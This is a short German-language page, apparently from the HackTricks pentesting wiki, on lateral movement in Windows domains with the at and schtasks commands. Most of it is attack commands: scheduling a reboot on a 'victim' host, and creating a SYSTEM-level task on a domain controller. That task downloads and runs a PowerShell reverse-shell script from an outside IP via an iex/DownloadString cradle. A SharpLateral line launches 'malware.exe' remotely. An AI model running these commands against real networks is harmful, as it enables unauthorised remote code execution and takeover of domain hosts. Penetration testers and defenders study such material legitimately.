# AtExec / SchtasksExec

{{#include ../../banners/hacktricks-training.md}}

## Wie funktioniert es

At ermöglicht das Planen von Aufgaben auf Hosts, bei denen Sie den Benutzernamen/(Passwort/Hash) kennen. So können Sie es verwenden, um Befehle auf anderen Hosts auszuführen und die Ausgabe zu erhalten.
```
At \\victim 11:00:00PM shutdown -r
```
Um schtasks zu verwenden, müssen Sie zuerst die Aufgabe erstellen und sie dann aufrufen:
```bash
schtasks /create /n <TASK_NAME> /tr C:\path\executable.exe /sc once /st 00:00 /S <VICTIM> /RU System
schtasks /run /tn <TASK_NAME> /S <VICTIM>
```

```bash
schtasks /create /S dcorp-dc.domain.local /SC Weekely /RU "NT Authority\SYSTEM" /TN "MyNewtask" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.X/InvokePowerShellTcp.ps1''')'"
schtasks /run /tn "MyNewtask" /S dcorp-dc.domain.local
```
Sie können auch [SharpLateral](https://github.com/mertdas/SharpLateral) verwenden:
```bash
SharpLateral schedule HOSTNAME C:\Users\Administrator\Desktop\malware.exe TaskName
```
Mehr Informationen über die [**Verwendung von schtasks mit Silver Tickets hier**](../active-directory-methodology/silver-ticket.md#host).

{{#include ../../banners/hacktricks-training.md}}
